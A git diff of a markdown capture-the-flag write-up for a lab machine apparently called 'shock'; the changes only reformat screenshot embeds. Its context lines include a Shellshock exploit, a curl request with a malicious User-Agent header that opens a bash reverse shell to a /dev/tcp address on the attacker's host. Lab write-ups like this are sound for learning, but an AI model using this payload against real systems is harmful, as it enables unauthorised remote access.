@@ -36,17 +36,23 @@ Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
 <p align="center">
   <img  src="Pasted image 20210715105154.png">
 </p>
-![screen](Pasted image 20210715105217.png)
+<p align="center">
+  <img  src="Pasted image 20210715105217.png">
+</p>
 
 ## directory enumeration
-![screen](Pasted image 20210715122218.png)
+<p align="center">
+  <img  src="Pasted image 20210715122218.png">
+</p>
 
 Found a `cgi-bin` folder, maybe its vulnerable to shellshock
 ('maybe' ? its literally the name of the machine `shock`)
 
 anyway let's enumerate the files insides the folder.
 
-![screen](Pasted image 20210715122453.png)
+<p align="center">
+  <img  src="Pasted image 20210715122453.png">
+</p>
 Found `user.sh` file, let's exploit it
 
 The command I used:
@@ -55,9 +61,15 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.16.63/44
 ```
 
 Got the shell :
-![screen](Pasted image 20210715122748.png)
+<p align="center">
+  <img  src="Pasted image 20210715122748.png">
+</p>
 
 ## Privilege escalation
 ### shell stabilization
-![screen](Pasted image 20210715123008.png)
-![screen](Pasted image 20210715123130.png)
+<p align="center">
+  <img  src="Pasted image 20210715123008.png">
+</p>
+<p align="center">
+  <img  src="Pasted image 20210715123130.png">
+</p>
